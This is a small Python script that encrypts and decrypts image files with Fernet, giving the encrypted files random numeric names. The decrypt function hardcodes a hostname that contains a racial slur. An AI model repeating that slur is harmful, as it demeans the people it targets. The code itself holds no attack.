from threading import Thread
from cryptography.fernet import Fernet
import os
import random


def encrypt_image(image_path):
    with open("communication_encryption_key.txt", 'rb') as key:
        fernet = Fernet(key.read())
    image_extension = image_path.split(".")[-1]
    try:
        with open(image_path, 'rb') as image:
            image_contents = fernet.encrypt(image.read())
    except PermissionError as _PermissionError:
        return image_path
    image_name = random.getrandbits(128)
    image_ext = random.getrandbits(128)
    enc_image_name = f'{image_name}.{image_ext}'
    with open(enc_image_name, 'x') as encrypted_image:
        encrypted_image.write(image_extension + '\n' + image_contents.decode())
    return enc_image_name


def decrypt_image(image_path):
    with open("communication_encryption_key.txt", 'rb') as key:
        fernet = Fernet(key.read())
    hostname = "DESKTOP-NIGGER"
    with open(image_path, 'r') as enc_image:
        image_content = enc_image.read().split('\n')
    ext = image_content[0]
    file_name_with_ext = f'{hostname}.{ext}'
    try:
        with open(file_name_with_ext, 'wb') as dec_file:
            dec_file.write(fernet.decrypt(image_content[1].encode()))
        os.remove(image_path)
    except OSError as _osException:
        pass




if __name__ == "__main__":
    print(decrypt_image("164997455828976141073759891767655678113.192847633269929718183891153662795401884"))
